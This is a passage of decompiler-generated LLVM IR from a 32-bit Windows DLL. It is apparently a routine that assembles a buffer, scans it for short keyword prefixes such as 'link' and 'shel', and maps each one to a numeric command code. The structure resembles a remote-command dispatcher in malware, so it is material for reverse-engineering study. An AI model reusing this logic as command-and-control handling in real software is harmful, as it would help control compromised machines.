  br i1 %84, label %dec_label_pc_1000a652, label %dec_label_pc_1000a64b, !insn.addr !6133

dec_label_pc_1000a64b:                            ; preds = %dec_label_pc_1000a644
  %85 = add i32 %67, 3, !insn.addr !6134
  %86 = inttoptr i32 %85 to i8*
  %87 = load i8, i8* %86, align 1, !insn.addr !6134
  %88 = icmp eq i8 %87, 112, !insn.addr !6134
  br i1 %88, label %dec_label_pc_1000a669, label %dec_label_pc_1000a652, !insn.addr !6135

dec_label_pc_1000a652:                            ; preds = %dec_label_pc_1000a64b, %dec_label_pc_1000a644, %dec_label_pc_1000a63d, %dec_label_pc_1000a632
  %89 = add i32 %esp.0.reload, -4, !insn.addr !6136
  %90 = inttoptr i32 %89 to i32*, !insn.addr !6136
  store i32 %59, i32* %90, align 4, !insn.addr !6136
  %91 = add i32 %esi.3.reload, %65, !insn.addr !6137
  %92 = inttoptr i32 %91 to i8*, !insn.addr !6137
  store i8 %69, i8* %92, align 1, !insn.addr !6137
  %93 = add nuw nsw i32 %esi.3.reload, 1, !insn.addr !6138
  %94 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6139
  %95 = icmp slt i32 %93, %94, !insn.addr !6140
  store i32 %72, i32* %ecx.3.reg2mem, !insn.addr !6140
  store i32 %89, i32* %esp.0.reg2mem, !insn.addr !6140
  store i32 %93, i32* %esi.3.reg2mem, !insn.addr !6140
  store i32 %72, i32* %ecx.5.reg2mem, !insn.addr !6140
  store i32 %89, i32* %esp.2.reg2mem, !insn.addr !6140
  store i32 %arg1, i32* %storemerge.reg2mem, !insn.addr !6140
  br i1 %95, label %dec_label_pc_1000a632, label %dec_label_pc_1000a6c8, !insn.addr !6140

dec_label_pc_1000a669:                            ; preds = %dec_label_pc_1000a64b
  %96 = add i32 %7, -41168, !insn.addr !6141
  %97 = add i32 %esi.3.reload, %96, !insn.addr !6141
  %98 = inttoptr i32 %97 to i8*, !insn.addr !6141
  store i8 %69, i8* %98, align 1, !insn.addr !6141
  %99 = load i8, i8* %76, align 1, !insn.addr !6142
  %100 = add i32 %esi.3.reload, %7
  %101 = add i32 %100, -41167, !insn.addr !6143
  %102 = inttoptr i32 %101 to i8*, !insn.addr !6143
  store i8 %99, i8* %102, align 1, !insn.addr !6143
  %103 = load i8, i8* %81, align 1, !insn.addr !6144
  %104 = add i32 %100, -41166, !insn.addr !6145
  %105 = inttoptr i32 %104 to i8*, !insn.addr !6145
  store i8 %103, i8* %105, align 1, !insn.addr !6145
  %106 = load i8, i8* %86, align 1, !insn.addr !6146
  %107 = add i32 %100, -41165, !insn.addr !6147
  %108 = inttoptr i32 %107 to i8*, !insn.addr !6147
  store i8 %106, i8* %108, align 1, !insn.addr !6147
  %109 = add nuw i32 %esi.3.reload, 4, !insn.addr !6148
  %110 = icmp ult i32 %109, 40000, !insn.addr !6149
  %111 = icmp eq i1 %110, false, !insn.addr !6150
  store i32 %72, i32* %ecx.8.reg2mem, !insn.addr !6150
  store i32 %66, i32* %edx.6.reg2mem, !insn.addr !6150
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !6150
  store i32 %esp.0.reload, i32* %esp.9.reg2mem, !insn.addr !6150
  store i32 %109, i32* %esi.9.reg2mem, !insn.addr !6150
  store i32 %59, i32* %edi.4.reg2mem, !insn.addr !6150
  br i1 %111, label %dec_label_pc_1000aaf1, label %dec_label_pc_1000a6a7, !insn.addr !6150

dec_label_pc_1000a6a7:                            ; preds = %dec_label_pc_1000a669
  %112 = add i32 %109, %96, !insn.addr !6151
  %113 = inttoptr i32 %112 to i8*, !insn.addr !6151
  store i8 0, i8* %113, align 1, !insn.addr !6151
  %114 = add i32 %67, 5, !insn.addr !6152
  store i32 %114, i32* %ecx.5.reg2mem, !insn.addr !6153
  store i32 %esp.0.reload, i32* %esp.2.reg2mem, !insn.addr !6153
  store i32 %114, i32* %storemerge.reg2mem, !insn.addr !6153
  br label %dec_label_pc_1000a6c8, !insn.addr !6153

dec_label_pc_1000a6c8:                            ; preds = %dec_label_pc_1000a652, %dec_label_pc_1000a5f6, %dec_label_pc_1000a6a7
  %115 = ptrtoint i32* %9 to i32, !insn.addr !6083
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %116 = icmp eq i32 %arg4, 0, !insn.addr !6154
  %117 = icmp eq i1 %116, false, !insn.addr !6155
  %118 = add i32 %esp.2.reload, -4
  %119 = inttoptr i32 %118 to i32*
  br i1 %117, label %dec_label_pc_1000a75c, label %dec_label_pc_1000a6d3, !insn.addr !6155

dec_label_pc_1000a6d3:                            ; preds = %dec_label_pc_1000a6c8
  %120 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !6156
  store i32 %120, i32* %119, align 4, !insn.addr !6156
  %121 = add i32 %esp.2.reload, -8, !insn.addr !6157
  %122 = inttoptr i32 %121 to i32*, !insn.addr !6157
  store i32 %115, i32* %122, align 4, !insn.addr !6157
  %123 = inttoptr i32 %storemerge.reload to i8*, !insn.addr !6158
  %124 = call i8* @lstrcpyA(i8* %123, i8* bitcast (i32* @1 to i8*)), !insn.addr !6158
  %125 = add i32 %esp.2.reload, -12, !insn.addr !6159
  %126 = inttoptr i32 %125 to i32*, !insn.addr !6159
  %127 = ptrtoint i32* %stack_var_-41172 to i32, !insn.addr !6159
  store i32 %127, i32* %126, align 4, !insn.addr !6159
  %128 = add i32 %esp.2.reload, -16, !insn.addr !6160
  %129 = inttoptr i32 %128 to i32*, !insn.addr !6160
  store i32 %115, i32* %129, align 4, !insn.addr !6160
  %130 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6161
  %131 = add i32 %esp.2.reload, -20, !insn.addr !6162
  %132 = inttoptr i32 %131 to i32*, !insn.addr !6162
  %133 = ptrtoint i128* %stack_var_-172 to i32, !insn.addr !6162
  store i32 %133, i32* %132, align 4, !insn.addr !6162
  %134 = add i32 %esp.2.reload, -24, !insn.addr !6163
  %135 = inttoptr i32 %134 to i32*, !insn.addr !6163
  store i32 %115, i32* %135, align 4, !insn.addr !6163
  %136 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6164
  %137 = add i32 %esp.2.reload, -28, !insn.addr !6165
  %138 = inttoptr i32 %137 to i32*, !insn.addr !6165
  %139 = ptrtoint i32* %stack_var_-1172 to i32, !insn.addr !6165
  store i32 %139, i32* %138, align 4, !insn.addr !6165
  %140 = add i32 %esp.2.reload, -32, !insn.addr !6166
  %141 = inttoptr i32 %140 to i32*, !insn.addr !6166
  store i32 %115, i32* %141, align 4, !insn.addr !6166
  %142 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6167
  %143 = add i32 %esp.2.reload, -36, !insn.addr !6168
  %144 = inttoptr i32 %143 to i32*, !insn.addr !6168
  store i32 %storemerge.reload, i32* %144, align 4, !insn.addr !6168
  %145 = call i32 @lstrlenA(i8* bitcast (i32* @1 to i8*)), !insn.addr !6169
  %146 = call i32 @function_1000b0c0(), !insn.addr !6170
  %147 = add i32 %esp.2.reload, -40, !insn.addr !6171
  %148 = inttoptr i32 %147 to i32*, !insn.addr !6171
  %149 = ptrtoint i128* %stack_var_-140 to i32, !insn.addr !6171
  store i32 %149, i32* %148, align 4, !insn.addr !6171
  %150 = add i32 %esp.2.reload, -44, !insn.addr !6172
  %151 = inttoptr i32 %150 to i32*, !insn.addr !6172
  store i32 %115, i32* %151, align 4, !insn.addr !6172
  %152 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6173
  %153 = sext i8 %arg3 to i32, !insn.addr !6174
  %154 = add i32 %esp.2.reload, -48, !insn.addr !6174
  %155 = inttoptr i32 %154 to i32*, !insn.addr !6174
  store i32 %153, i32* %155, align 4, !insn.addr !6174
  %156 = add i32 %esp.2.reload, -52, !insn.addr !6175
  %157 = inttoptr i32 %156 to i32*, !insn.addr !6175
  store i32 %115, i32* %157, align 4, !insn.addr !6175
  %158 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6176
  %159 = add i32 %esp.2.reload, -56, !insn.addr !6177
  %160 = inttoptr i32 %159 to i32*, !insn.addr !6177
  store i32 %storemerge.reload, i32* %160, align 4, !insn.addr !6177
  %161 = add i32 %esp.2.reload, -60, !insn.addr !6178
  %162 = inttoptr i32 %161 to i32*, !insn.addr !6178
  store i32 %115, i32* %162, align 4, !insn.addr !6178
  %163 = call i8* @lstrcatA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6179
  %164 = add i32 %esp.2.reload, -64, !insn.addr !6180
  %165 = inttoptr i32 %164 to i32*, !insn.addr !6180
  store i32 %145, i32* %165, align 4, !insn.addr !6180
  %166 = add i32 %esp.2.reload, -68, !insn.addr !6181
  %167 = inttoptr i32 %166 to i32*, !insn.addr !6181
  %168 = ptrtoint i32* %stack_var_-182132 to i32, !insn.addr !6181
  store i32 %168, i32* %167, align 4, !insn.addr !6181
  %169 = add i32 %esp.2.reload, -72, !insn.addr !6182
  %170 = inttoptr i32 %169 to i32*, !insn.addr !6182
  store i32 0, i32* %170, align 4, !insn.addr !6182
  %171 = call i32 @function_10009f10(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !6183
  store i32 %171, i32* %eax.0.reg2mem, !insn.addr !6184
  store i32 %169, i32* %esp.3.reg2mem, !insn.addr !6184
  br label %dec_label_pc_1000a778, !insn.addr !6184

dec_label_pc_1000a75c:                            ; preds = %dec_label_pc_1000a6c8
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  store i32 %ecx.5.reload, i32* %119, align 4, !insn.addr !6185
  %172 = add i32 %esp.2.reload, -8, !insn.addr !6186
  %173 = inttoptr i32 %172 to i32*, !insn.addr !6186
  %174 = ptrtoint i32* %stack_var_-182132 to i32, !insn.addr !6186
  store i32 %174, i32* %173, align 4, !insn.addr !6186
  %175 = add i32 %esp.2.reload, -12, !insn.addr !6187
  %176 = inttoptr i32 %175 to i32*, !insn.addr !6187
  store i32 %arg4, i32* %176, align 4, !insn.addr !6187
  %177 = call i32 @function_10009f10(i32 %storemerge.reload, i32 ptrtoint (i32* @1 to i32)), !insn.addr !6188
  store i32 %177, i32* %eax.0.reg2mem, !insn.addr !6189
  store i32 %175, i32* %esp.3.reg2mem, !insn.addr !6189
  br label %dec_label_pc_1000a778, !insn.addr !6189

dec_label_pc_1000a778:                            ; preds = %dec_label_pc_1000a75c, %dec_label_pc_1000a6d3
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %178 = add i32 %esp.3.reload, 12, !insn.addr !6190
  %179 = icmp eq i32 %eax.0.reload, 0, !insn.addr !6191
  store i32 %178, i32* %esp.8.reg2mem, !insn.addr !6192
  br i1 %179, label %dec_label_pc_1000aacb, label %dec_label_pc_1000a783, !insn.addr !6192

dec_label_pc_1000a783:                            ; preds = %dec_label_pc_1000a778
  %180 = add i32 %esp.3.reload, 8, !insn.addr !6193
  %181 = inttoptr i32 %180 to i32*, !insn.addr !6193
  store i32 ptrtoint ([5 x i8]* @global_var_10039578 to i32), i32* %181, align 4, !insn.addr !6193
  %182 = add i32 %esp.3.reload, 4, !insn.addr !6194
  %183 = inttoptr i32 %182 to i32*, !insn.addr !6194
  %184 = ptrtoint i32* %stack_var_-182132 to i32, !insn.addr !6194
  store i32 %184, i32* %183, align 4, !insn.addr !6194
  %185 = call i8* @StrStrIA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6195
  %186 = icmp eq i8* %185, null, !insn.addr !6196
  store i32 %182, i32* %esp.4.reg2mem, !insn.addr !6197
  br i1 %186, label %dec_label_pc_1000a7be, label %dec_label_pc_1000a795, !insn.addr !6197

dec_label_pc_1000a795:                            ; preds = %dec_label_pc_1000aa26, %dec_label_pc_1000a783
  %esp.4.reload = load i32, i32* %esp.4.reg2mem
  %187 = add i32 %esp.4.reload, -4, !insn.addr !6198
  %188 = inttoptr i32 %187 to i32*, !insn.addr !6198
  store i32 %115, i32* %188, align 4, !insn.addr !6198
  %189 = call i32* @LocalFree(i32* nonnull @1), !insn.addr !6199
  store i32 %187, i32* %esp.5.reg2mem, !insn.addr !6199
  br label %dec_label_pc_1000a79c, !insn.addr !6199

dec_label_pc_1000a79c:                            ; preds = %dec_label_pc_1000aab1, %dec_label_pc_1000a795
  %esp.5.reload = load i32, i32* %esp.5.reg2mem
  %190 = load i32, i32* @global_var_100409e0, align 4, !insn.addr !6200
  %191 = add i32 %esp.5.reload, -4, !insn.addr !6200
  %192 = inttoptr i32 %191 to i32*, !insn.addr !6200
  store i32 %190, i32* %192, align 4, !insn.addr !6200
  %193 = call i1 @ReleaseMutex(i32* nonnull @1), !insn.addr !6201
  %194 = call i32 @"@__security_check_cookie@4"(), !insn.addr !6202
  ret i32 %194, !insn.addr !6203

dec_label_pc_1000a7be:                            ; preds = %dec_label_pc_1000a783
  %195 = inttoptr i32 %esp.3.reload to i32*, !insn.addr !6204
  store i32 ptrtoint ([14 x i8]* @global_var_10039580 to i32), i32* %195, align 4, !insn.addr !6204
  %196 = add i32 %esp.3.reload, -4, !insn.addr !6205
  %197 = inttoptr i32 %196 to i32*, !insn.addr !6205
  store i32 %184, i32* %197, align 4, !insn.addr !6205
  %198 = call i8* @StrStrIA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6206
  %199 = icmp eq i8* %198, null, !insn.addr !6207
  %200 = icmp eq i1 %199, false, !insn.addr !6208
  store i32 %196, i32* %esp.8.reg2mem, !insn.addr !6208
  br i1 %200, label %dec_label_pc_1000aacb, label %dec_label_pc_1000a7d4, !insn.addr !6208

dec_label_pc_1000a7d4:                            ; preds = %dec_label_pc_1000a7be
  store i8* inttoptr (i32 1802398060 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6209
  %201 = add i32 %esp.3.reload, -8, !insn.addr !6210
  %202 = inttoptr i32 %201 to i32*, !insn.addr !6210
  %203 = ptrtoint i8** %stack_var_-20 to i32, !insn.addr !6210
  store i32 %203, i32* %202, align 4, !insn.addr !6210
  %204 = add i32 %esp.3.reload, -12, !insn.addr !6211
  %205 = inttoptr i32 %204 to i32*, !insn.addr !6211
  store i32 %184, i32* %205, align 4, !insn.addr !6211
  %206 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6212
  %207 = call i8* @StrStrIA(i8* %206, i8* inttoptr (i32 58 to i8*)), !insn.addr !6212
  %208 = icmp eq i8* %207, null, !insn.addr !6213
  br i1 %208, label %dec_label_pc_1000a808, label %dec_label_pc_1000a7f4, !insn.addr !6214

dec_label_pc_1000a7f4:                            ; preds = %dec_label_pc_1000a7d4
  %209 = ptrtoint i8* %207 to i32, !insn.addr !6212
  %210 = add i32 %209, 5, !insn.addr !6215
  %211 = inttoptr i32 %arg2 to i32*, !insn.addr !6216
  store i32 1, i32* %211, align 4, !insn.addr !6216
  store i32 %204, i32* %esp.7.reg2mem, !insn.addr !6217
  store i32 %210, i32* %esi.5.reg2mem, !insn.addr !6217
  br label %dec_label_pc_1000aa26, !insn.addr !6217

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000a7d4
  store i8* inttoptr (i32 1818585203 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6218
  %212 = add i32 %esp.3.reload, -16, !insn.addr !6219
  %213 = inttoptr i32 %212 to i32*, !insn.addr !6219
  store i32 %203, i32* %213, align 4, !insn.addr !6219
  %214 = add i32 %esp.3.reload, -20, !insn.addr !6220
  %215 = inttoptr i32 %214 to i32*, !insn.addr !6220
  store i32 %184, i32* %215, align 4, !insn.addr !6220
  %216 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6221
  %217 = call i8* @StrStrIA(i8* %216, i8* inttoptr (i32 14956 to i8*)), !insn.addr !6221
  %218 = icmp eq i8* %217, null, !insn.addr !6222
  br i1 %218, label %dec_label_pc_1000a840, label %dec_label_pc_1000a82c, !insn.addr !6223

dec_label_pc_1000a82c:                            ; preds = %dec_label_pc_1000a808
  %219 = ptrtoint i8* %217 to i32, !insn.addr !6221
  %220 = add i32 %219, 6, !insn.addr !6224
  %221 = inttoptr i32 %arg2 to i32*, !insn.addr !6225
  store i32 0, i32* %221, align 4, !insn.addr !6225
  store i32 %214, i32* %esp.7.reg2mem, !insn.addr !6226
  store i32 %220, i32* %esi.5.reg2mem, !insn.addr !6226
  br label %dec_label_pc_1000aa26, !insn.addr !6226

dec_label_pc_1000a840:                            ; preds = %dec_label_pc_1000a808
  store i8* inttoptr (i32 979660653 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6227
  %222 = add i32 %esp.3.reload, -24, !insn.addr !6228
  %223 = inttoptr i32 %222 to i32*, !insn.addr !6228
  store i32 %203, i32* %223, align 4, !insn.addr !6228
  %224 = add i32 %esp.3.reload, -28, !insn.addr !6229
  %225 = inttoptr i32 %224 to i32*, !insn.addr !6229
  store i32 %184, i32* %225, align 4, !insn.addr !6229
  %226 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6230
  %227 = call i8* @StrStrIA(i8* %226, i8* null), !insn.addr !6230
  %228 = icmp eq i8* %227, null, !insn.addr !6231
  br i1 %228, label %dec_label_pc_1000a872, label %dec_label_pc_1000a85e, !insn.addr !6232

dec_label_pc_1000a85e:                            ; preds = %dec_label_pc_1000a840
  %229 = ptrtoint i8* %227 to i32, !insn.addr !6230
  %230 = add i32 %229, 4, !insn.addr !6233
  %231 = inttoptr i32 %arg2 to i32*, !insn.addr !6234
  store i32 2, i32* %231, align 4, !insn.addr !6234
  store i32 %224, i32* %esp.7.reg2mem, !insn.addr !6235
  store i32 %230, i32* %esi.5.reg2mem, !insn.addr !6235
  br label %dec_label_pc_1000aa26, !insn.addr !6235

dec_label_pc_1000a872:                            ; preds = %dec_label_pc_1000a840
  store i8* inttoptr (i32 979660917 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6236
  %232 = add i32 %esp.3.reload, -32, !insn.addr !6237
  %233 = inttoptr i32 %232 to i32*, !insn.addr !6237
  store i32 %203, i32* %233, align 4, !insn.addr !6237
  %234 = add i32 %esp.3.reload, -36, !insn.addr !6238
  %235 = inttoptr i32 %234 to i32*, !insn.addr !6238
  store i32 %184, i32* %235, align 4, !insn.addr !6238
  %236 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6239
  %237 = call i8* @StrStrIA(i8* %236, i8* null), !insn.addr !6239
  %238 = icmp eq i8* %237, null, !insn.addr !6240
  br i1 %238, label %dec_label_pc_1000a898, label %dec_label_pc_1000a890, !insn.addr !6241

dec_label_pc_1000a890:                            ; preds = %dec_label_pc_1000a872
  %239 = ptrtoint i8* %237 to i32, !insn.addr !6239
  %240 = add i32 %239, 4, !insn.addr !6242
  store i32 %234, i32* %esp.6.reg2mem, !insn.addr !6243
  store i32 %240, i32* %esi.4.reg2mem, !insn.addr !6243
  br label %dec_label_pc_1000aa1a, !insn.addr !6243

dec_label_pc_1000a898:                            ; preds = %dec_label_pc_1000a872
  store i8* inttoptr (i32 979662692 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6244
  %241 = add i32 %esp.3.reload, -40, !insn.addr !6245
  %242 = inttoptr i32 %241 to i32*, !insn.addr !6245
  store i32 %203, i32* %242, align 4, !insn.addr !6245
  %243 = add i32 %esp.3.reload, -44, !insn.addr !6246
  %244 = inttoptr i32 %243 to i32*, !insn.addr !6246
  store i32 %184, i32* %244, align 4, !insn.addr !6246
  %245 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6247
  %246 = call i8* @StrStrIA(i8* %245, i8* null), !insn.addr !6247
  %247 = icmp eq i8* %246, null, !insn.addr !6248
  br i1 %247, label %dec_label_pc_1000a8ca, label %dec_label_pc_1000a8b6, !insn.addr !6249

dec_label_pc_1000a8b6:                            ; preds = %dec_label_pc_1000a898
  %248 = ptrtoint i8* %246 to i32, !insn.addr !6247
  %249 = add i32 %248, 4, !insn.addr !6250
  %250 = inttoptr i32 %arg2 to i32*, !insn.addr !6251
  store i32 4, i32* %250, align 4, !insn.addr !6251
  store i32 %243, i32* %esp.7.reg2mem, !insn.addr !6252
  store i32 %249, i32* %esi.5.reg2mem, !insn.addr !6252
  br label %dec_label_pc_1000aa26, !insn.addr !6252

dec_label_pc_1000a8ca:                            ; preds = %dec_label_pc_1000a898
  store i8* inttoptr (i32 3828843 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6253
  %251 = add i32 %esp.3.reload, -48, !insn.addr !6254
  %252 = inttoptr i32 %251 to i32*, !insn.addr !6254
  store i32 %203, i32* %252, align 4, !insn.addr !6254
  %253 = add i32 %esp.3.reload, -52, !insn.addr !6255
  %254 = inttoptr i32 %253 to i32*, !insn.addr !6255
  store i32 %184, i32* %254, align 4, !insn.addr !6255
  %255 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6256
  %256 = call i8* @StrStrIA(i8* %255, i8* bitcast (i32* @1 to i8*)), !insn.addr !6256
  %257 = icmp eq i8* %256, null, !insn.addr !6257
  br i1 %257, label %dec_label_pc_1000a8f8, label %dec_label_pc_1000a8e4, !insn.addr !6258

dec_label_pc_1000a8e4:                            ; preds = %dec_label_pc_1000a8ca
  %258 = ptrtoint i8* %256 to i32, !insn.addr !6256
  %259 = add i32 %258, 3, !insn.addr !6259
  %260 = inttoptr i32 %arg2 to i32*, !insn.addr !6260
  store i32 5, i32* %260, align 4, !insn.addr !6260
  store i32 %253, i32* %esp.7.reg2mem, !insn.addr !6261
  store i32 %259, i32* %esi.5.reg2mem, !insn.addr !6261
  br label %dec_label_pc_1000aa26, !insn.addr !6261

dec_label_pc_1000a8f8:                            ; preds = %dec_label_pc_1000a8ca
  store i8* inttoptr (i32 980446835 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6262
  %261 = add i32 %esp.3.reload, -56, !insn.addr !6263
  %262 = inttoptr i32 %261 to i32*, !insn.addr !6263
  store i32 %203, i32* %262, align 4, !insn.addr !6263
  %263 = add i32 %esp.3.reload, -60, !insn.addr !6264
  %264 = inttoptr i32 %263 to i32*, !insn.addr !6264
  store i32 %184, i32* %264, align 4, !insn.addr !6264
  %265 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6265
  %266 = call i8* @StrStrIA(i8* %265, i8* null), !insn.addr !6265
  %267 = icmp eq i8* %266, null, !insn.addr !6266
  br i1 %267, label %dec_label_pc_1000a92a, label %dec_label_pc_1000a916, !insn.addr !6267

dec_label_pc_1000a916:                            ; preds = %dec_label_pc_1000a8f8
  %268 = ptrtoint i8* %266 to i32, !insn.addr !6265
  %269 = add i32 %268, 3, !insn.addr !6268
  %270 = inttoptr i32 %arg2 to i32*, !insn.addr !6269
  store i32 6, i32* %270, align 4, !insn.addr !6269
  store i32 %263, i32* %esp.7.reg2mem, !insn.addr !6270
  store i32 %269, i32* %esi.5.reg2mem, !insn.addr !6270
  br label %dec_label_pc_1000aa26, !insn.addr !6270

dec_label_pc_1000a92a:                            ; preds = %dec_label_pc_1000a8f8
  store i8* inttoptr (i32 1920234357 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6271
  %271 = add i32 %esp.3.reload, -64, !insn.addr !6272
  %272 = inttoptr i32 %271 to i32*, !insn.addr !6272
  store i32 %203, i32* %272, align 4, !insn.addr !6272
  %273 = add i32 %esp.3.reload, -68, !insn.addr !6273
  %274 = inttoptr i32 %273 to i32*, !insn.addr !6273
  store i32 %184, i32* %274, align 4, !insn.addr !6273
  %275 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6274
  %276 = call i8* @StrStrIA(i8* %275, i8* inttoptr (i32 58 to i8*)), !insn.addr !6274
  %277 = icmp eq i8* %276, null, !insn.addr !6275
  br i1 %277, label %dec_label_pc_1000a95e, label %dec_label_pc_1000a94a, !insn.addr !6276

dec_label_pc_1000a94a:                            ; preds = %dec_label_pc_1000a92a
  %278 = ptrtoint i8* %276 to i32, !insn.addr !6274
  %279 = add i32 %278, 4, !insn.addr !6277
  %280 = inttoptr i32 %arg2 to i32*, !insn.addr !6278
  store i32 7, i32* %280, align 4, !insn.addr !6278
  store i32 %273, i32* %esp.7.reg2mem, !insn.addr !6279
  store i32 %279, i32* %esi.5.reg2mem, !insn.addr !6279
  br label %dec_label_pc_1000aa26, !insn.addr !6279

dec_label_pc_1000a95e:                            ; preds = %dec_label_pc_1000a92a
  store i8* inttoptr (i32 1886352501 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6280
  %281 = add i32 %esp.3.reload, -72, !insn.addr !6281
  %282 = inttoptr i32 %281 to i32*, !insn.addr !6281
  store i32 %203, i32* %282, align 4, !insn.addr !6281
  %283 = add i32 %esp.3.reload, -76, !insn.addr !6282
  %284 = inttoptr i32 %283 to i32*, !insn.addr !6282
  store i32 %184, i32* %284, align 4, !insn.addr !6282
  %285 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6283
  %286 = call i8* @StrStrIA(i8* %285, i8* inttoptr (i32 58 to i8*)), !insn.addr !6283
  %287 = icmp eq i8* %286, null, !insn.addr !6284
  br i1 %287, label %dec_label_pc_1000a992, label %dec_label_pc_1000a97e, !insn.addr !6285

dec_label_pc_1000a97e:                            ; preds = %dec_label_pc_1000a95e
  %288 = ptrtoint i8* %286 to i32, !insn.addr !6283
  %289 = add i32 %288, 4, !insn.addr !6286
  %290 = inttoptr i32 %arg2 to i32*, !insn.addr !6287
  store i32 9, i32* %290, align 4, !insn.addr !6287
  store i32 %283, i32* %esp.7.reg2mem, !insn.addr !6288
  store i32 %289, i32* %esi.5.reg2mem, !insn.addr !6288
  br label %dec_label_pc_1000aa26, !insn.addr !6288

dec_label_pc_1000a992:                            ; preds = %dec_label_pc_1000a95e
  store i8* inttoptr (i32 1819763827 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6289
  %291 = add i32 %esp.3.reload, -80, !insn.addr !6290
  %292 = inttoptr i32 %291 to i32*, !insn.addr !6290
  store i32 %203, i32* %292, align 4, !insn.addr !6290
  %293 = add i32 %esp.3.reload, -84, !insn.addr !6291
  %294 = inttoptr i32 %293 to i32*, !insn.addr !6291
  store i32 %184, i32* %294, align 4, !insn.addr !6291
  %295 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6292
  %296 = call i8* @StrStrIA(i8* %295, i8* inttoptr (i32 58 to i8*)), !insn.addr !6292
  %297 = icmp eq i8* %296, null, !insn.addr !6293
  br i1 %297, label %dec_label_pc_1000a9c3, label %dec_label_pc_1000a9b2, !insn.addr !6294

dec_label_pc_1000a9b2:                            ; preds = %dec_label_pc_1000a992
  %298 = ptrtoint i8* %296 to i32, !insn.addr !6292
  %299 = add i32 %298, 4, !insn.addr !6295
  %300 = inttoptr i32 %arg2 to i32*, !insn.addr !6296
  store i32 8, i32* %300, align 4, !insn.addr !6296
  store i32 %293, i32* %esp.7.reg2mem, !insn.addr !6297
  store i32 %299, i32* %esi.5.reg2mem, !insn.addr !6297
  br label %dec_label_pc_1000aa26, !insn.addr !6297

dec_label_pc_1000a9c3:                            ; preds = %dec_label_pc_1000a992
  store i8* inttoptr (i32 1684890472 to i8*), i8** %stack_var_-20, align 4, !insn.addr !6298
  %301 = add i32 %esp.3.reload, -88, !insn.addr !6299
  %302 = inttoptr i32 %301 to i32*, !insn.addr !6299
  store i32 %203, i32* %302, align 4, !insn.addr !6299
  %303 = add i32 %esp.3.reload, -92, !insn.addr !6300
  %304 = inttoptr i32 %303 to i32*, !insn.addr !6300
  store i32 %184, i32* %304, align 4, !insn.addr !6300
  %305 = load i8*, i8** %stack_var_-20, align 4, !insn.addr !6301
  %306 = call i8* @StrStrIA(i8* %305, i8* inttoptr (i32 58 to i8*)), !insn.addr !6301
  %307 = icmp eq i8* %306, null, !insn.addr !6302
  br i1 %307, label %dec_label_pc_1000a9f4, label %dec_label_pc_1000a9e3, !insn.addr !6303

dec_label_pc_1000a9e3:                            ; preds = %dec_label_pc_1000a9c3
  %308 = ptrtoint i8* %306 to i32, !insn.addr !6301
  %309 = add i32 %308, 4, !insn.addr !6304
  %310 = inttoptr i32 %arg2 to i32*, !insn.addr !6305
  store i32 10, i32* %310, align 4, !insn.addr !6305
  store i32 %303, i32* %esp.7.reg2mem, !insn.addr !6306
  store i32 %309, i32* %esi.5.reg2mem, !insn.addr !6306
  br label %dec_label_pc_1000aa26, !insn.addr !6306

dec_label_pc_1000a9f4:                            ; preds = %dec_label_pc_1000a9c3
  %311 = add i32 %esp.3.reload, -96, !insn.addr !6307
  %312 = inttoptr i32 %311 to i32*, !insn.addr !6307
  store i32 ptrtoint ([3 x i8]* @global_var_10039570 to i32), i32* %312, align 4, !insn.addr !6307
  %313 = add i32 %esp.3.reload, -100, !insn.addr !6308
  %314 = inttoptr i32 %313 to i32*, !insn.addr !6308
  store i32 %184, i32* %314, align 4, !insn.addr !6308
  %315 = call i8* @StrStrIA(i8* bitcast (i32* @1 to i8*), i8* bitcast (i32* @1 to i8*)), !insn.addr !6309
  %316 = icmp eq i8* %315, null, !insn.addr !6310
  store i32 %313, i32* %esp.8.reg2mem, !insn.addr !6311
  br i1 %316, label %dec_label_pc_1000aacb, label %dec_label_pc_1000aa0c, !insn.addr !6311

dec_label_pc_1000aa0c:                            ; preds = %dec_label_pc_1000a9f4
  %317 = ptrtoint i8* %315 to i32, !insn.addr !6309
  %318 = add i32 %317, 2, !insn.addr !6312
